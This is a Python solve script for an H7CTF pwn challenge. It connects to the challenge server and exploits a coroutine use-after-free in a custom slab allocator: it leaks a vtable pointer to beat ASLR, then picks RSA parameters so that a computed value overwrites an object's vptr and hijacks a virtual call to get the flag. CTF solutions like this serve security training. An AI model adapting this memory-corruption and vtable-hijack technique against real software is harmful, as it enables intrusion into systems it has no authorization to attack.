#!/usr/bin/env python3
"""
solve.py - Frame of Reference / Attest (H7CTF)
Exploit against C++20 coroutine use-after-free / dangling reference in custom slab allocator.
"""

import socket
import math
import sys

def read_until(s, target):
    buf = b""
    while not buf.endswith(target):
        c = s.recv(1)
        if not c:
            break
        buf += c
    return buf

def solve(host="pwn.h7tex.com", port=43920):
    s = socket.socket()
    s.settimeout(10)
    s.connect((host, port))

    # Read banner
    read_until(s, b"> ")

    # ================= Stage 1: ASLR Leak =================
    # In do_prepare: km is allocated from g_slab (cell_63), finalize coroutine is started & suspended,
    # km is released back to g_slab.
    # Then do_addcipher(1) allocates cell_63 for Notary.
    # Notary constructor writes vptr at cell_63 + 0 (which corresponds to km->p).
    # Then do_submit resumes finalize, which reads p = load_u128(km.p) = Notary_vptr,
    # prints n = p * q, and aborts because gcd(e % lam, lam) != 1.
    s.sendall(b"1\n")
    read_until(s, b"e> ")
    s.sendall(b"02\n")
    read_until(s, b"p> ")
    s.sendall(b"00\n")
    read_until(s, b"q> ")
    s.sendall(b"03\n")
    read_until(s, b"> ")

    # Add Notary cipher
    s.sendall(b"3\n")
    read_until(s, b"> ")
    s.sendall(b"1\n")
    read_until(s, b"> ")

    # Submit to resume coroutine
    s.sendall(b"2\n")
    read_until(s, b"doc> ")
    s.sendall(b"00\n")

    mod_line = read_until(s, b"\n").decode().strip()
    n_hex = mod_line.split()[1]
    n = int(n_hex, 16)
    p_vptr = n // 3
    print(f"[+] Leaked Notary vptr: {hex(p_vptr)}")

    read_until(s, b"> ")

    # ================= Stage 2: Vtable Hijack =================
    # In binary:
    # _ZTV6Notary: 0x6c08 (+16 -> 0x6c18)
    # _ZTV11EscrowAudit: 0x6c38 (+16 -> 0x6c48)
    # Offset difference = 0x30 bytes
    target_vptr = p_vptr + 0x30
    print(f"[+] Target EscrowAudit vptr: {hex(target_vptr)}")

    # In Job 2:
    # km2 and s.signer will both share cell_62.
    # km2->p will be Notary_vptr (p_vptr).
    # finalize computes:
    # lam = lcm(p_vptr - 1, q - 1)
    # d = mod_inv(e, lam)
    # store_u128(km.p, d) -> writes d into cell_62 + 0 (s.signer's vptr)
    #
    # We want d = target_vptr.
    # Since target_vptr is even, lam must be odd (so gcd(target_vptr, lam) == 1).
    # Since p_vptr is even, p_vptr - 1 is odd.
    # Setting q = k + 1 for odd k ensures q - 1 = k is odd, so lam is odd.
    q_found = None
    e_found = None
    for k in range(3, 1000, 2):
        lam = math.lcm(p_vptr - 1, k)
        if lam > target_vptr and math.gcd(target_vptr, lam) == 1:
            e_val = pow(target_vptr, -1, lam)
            q_val = k + 1
            # Verify inverse
            if pow(e_val, -1, lam) == target_vptr:
                q_found = q_val
                e_found = e_val
                break

    if not q_found or not e_found:
        raise RuntimeError("Failed to find valid parameters for q and e")

    print(f"[+] Computed Job 2 parameters: q={hex(q_found)}, e={hex(e_found)}")

    # Prepare Job 2
    s.sendall(b"1\n")
    read_until(s, b"e> ")
    s.sendall(hex(e_found)[2:].encode() + b"\n")
    read_until(s, b"p> ")
    s.sendall(b"00\n")
    read_until(s, b"q> ")
    s.sendall(hex(q_found)[2:].encode() + b"\n")
    read_until(s, b"> ")

    # Add Notary cipher (cell_62 assigned to s.signer)
    s.sendall(b"3\n")
    read_until(s, b"> ")
    s.sendall(b"1\n")
    read_until(s, b"> ")

    # Submit to resume coroutine and trigger store_u128(km.p, d)
    s.sendall(b"2\n")
    read_until(s, b"doc> ")
    s.sendall(b"00\n")

    res1 = read_until(s, b"\n").decode().strip()
    res2 = read_until(s, b"\n").decode().strip()
    print(f"[+] Finalize response: {res1} | {res2}")
    read_until(s, b"> ")

    # ================= Stage 3: Sign to execute EscrowAudit::run =================
    s.sendall(b"4\n")
    read_until(s, b"msg> ")
    s.sendall(b"\n")

    flag_line = read_until(s, b"\n").decode().strip()
    s.close()

    if "audit" in flag_line:
        flag_hex = flag_line.split()[1]
        flag = bytes.fromhex(flag_hex).decode()
        print(f"[+] FLAG: {flag}")
        return flag
    else:
        print(f"[-] Unexpected output: {flag_line}")
        return None

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "pwn.h7tex.com"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 43920
    solve(host, port)
